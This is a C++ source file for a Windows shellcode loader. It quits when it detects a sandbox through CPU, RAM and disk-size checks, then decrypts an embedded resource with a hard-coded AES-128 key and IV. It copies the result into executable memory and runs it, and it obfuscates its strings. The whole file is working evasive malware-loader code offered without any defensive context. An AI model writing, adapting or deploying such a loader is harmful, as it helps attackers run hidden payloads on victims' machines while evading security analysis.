#include <iostream>
#include <windows.h>

#include "skc.hpp"

#include "include/aes.h"

bool QuitIfSandboxed() {

    // Check CPU > 2 cores
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 4) {
        return true;
    }

    // Check RAM > 4GB
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys / 1024 / 1024 < 4096) {
        return true;
    }

    // Check HDD > 100GB
    HANDLE hDevice = CreateFileW(SKCR(L"\\\\.\\PhysicalDrive0"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD dwBytes;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &dwBytes, (LPOVERLAPPED) NULL);
    if (pDiskGeometry.Cylinders.QuadPart * (ULONG) pDiskGeometry.TracksPerCylinder * (ULONG) pDiskGeometry.SectorsPerTrack * (ULONG) pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024 < 100) {
        return true;
    }

    return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {

    if (QuitIfSandboxed()) return 0;

    // Load resource (the executable)
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(101), SKCR("RT_RCDATA"));
	DWORD dwSize = SizeofResource(NULL, hResource);
	HGLOBAL hResData = LoadResource(NULL, hResource);
    LPVOID pData = LockResource(hResData);
    std::vector<unsigned char> payload((unsigned char*) pData, (unsigned char*) (pData) + dwSize);
    FreeResource(hResData);

    // Decrypt AES encrypted shellcode
    unsigned char* _key = (unsigned char*) SKCC("\x1A\xB2\xF8\xC5\x03\x7D\x9E\xA0\x6F\x84\x2D\xE7\x1B\x5C\x91\x6E");
    unsigned char* _iv = (unsigned char*) SKCC("\x8F\xD4\xE2\x70\xA9\xCB\xF5\x12\x63\x4E\x8A\xB7\x01\x9D\x3F\x56");
    std::vector<unsigned char> key(_key, _key + 16);
    std::vector<unsigned char> iv(_iv, _iv + 16);
    AES aes(AESKeyLength::AES_128);
    payload = aes.DecryptCBC(payload, key, iv);

	// Allocate memory
	void* lpMem = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(lpMem, payload.data(), dwSize);

	// Execute shellcode
	((void(*)()) lpMem)();

    // Cleanup
	VirtualFree(lpMem, 0, MEM_RELEASE);
    return 0;
}